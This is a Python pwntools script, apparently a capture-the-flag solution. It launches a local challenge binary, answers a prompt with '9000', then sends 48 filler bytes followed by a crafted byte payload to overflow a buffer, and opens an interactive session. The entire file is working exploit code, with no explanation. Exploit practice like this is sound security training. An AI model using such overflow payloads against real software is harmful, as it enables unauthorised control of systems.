from pwn import *
import sys

class io:
    @classmethod
    def connect(cls):
        cls.io = process('/pwn/' + sys.argv[0].split('.py')[0])
    @classmethod
    def readuntil(cls, x, timeout = 5):
        return cls.readuntil_internal(x, time_out = timeout)
    @classmethod
    def readuntil_internal(cls, x, time_out):
        ret = cls.io.readuntil(x, timeout = time_out)
        sys.stdout.write(ret)
        return ret
    @classmethod
    def write(cls, x):
        sys.stdout.write(x)
        cls.io.write(x)
    @classmethod
    def sendline(cls, x):
        cls.write(x + '\n')
    @classmethod
    def close(cls):
        cls.io.close()
    @classmethod
    def interactive(cls):
        cls.io.interactive()


def main():
    io.connect()

    pl = '\xc4'*2
    pl += '\xfa'*4
    pl += '\x9b'*4
    pl += '\x02'*4
    pl += '\x14'*2
    pl += '\x4c'*4
    pl += '\x59'*3
    pl += '\x97'*3
    pl += '\0'

    io.readuntil('? ')
    io.sendline('9000')
    io.readuntil('!')
    io.sendline('A'*48 + pl)

if __name__ == '__main__':
    main()
    io.interactive()
